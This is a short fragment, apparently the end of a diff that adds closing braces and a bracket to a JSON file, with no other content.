+    }
+  ]
+}
